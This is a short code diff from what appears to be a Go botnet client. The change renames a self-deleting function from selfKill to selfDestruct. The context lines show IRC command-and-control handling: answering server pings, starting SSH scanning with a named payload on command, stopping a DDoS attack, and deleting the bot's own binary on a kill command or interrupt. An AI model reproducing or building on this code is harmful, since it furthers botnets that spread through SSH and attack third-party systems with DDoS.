@@ -26,7 +26,7 @@ const (
 ////////////////////////// END HERE!!! ///////////////////////////////
 /////////////////////////////////////////////////////////////////////
 
-func selfKill() {
+func selfDestruct() {
 	os.Remove(os.Args[0])
 	os.Exit(0)
 }
@@ -47,7 +47,7 @@ func main() {
 	//Inturrupt Checker
 	go func() {
 		<-sig
-		selfKill()
+		selfDestruct()
 	}()
 
 	for {
@@ -57,7 +57,7 @@ func main() {
 		//Server signal interact
 		go func() {
 			if err != nil {
-				selfKill()
+				selfDestruct()
 			}
 			if tools.IRC_Find(ircRead, "PING :") {
 				tools.IRC_Send(irc, "PONG "+tools.IRC_Recv(ircRead, 1))
@@ -96,7 +96,7 @@ func main() {
 				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START SCANNING.")
 				tools.SSH_Conn(irc, tools.IRC_Recv(ircRead, 4), IRC_Channel, Payload_Name)
 			} else if tools.IRC_Find(ircRead, "?kill") {
-				selfKill()
+				selfDestruct()
 			} else if tools.IRC_Find(ircRead, "?stop.ddos") {
 				tools.DDoS_Switch = true
 				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :STOP ATTACKING.")
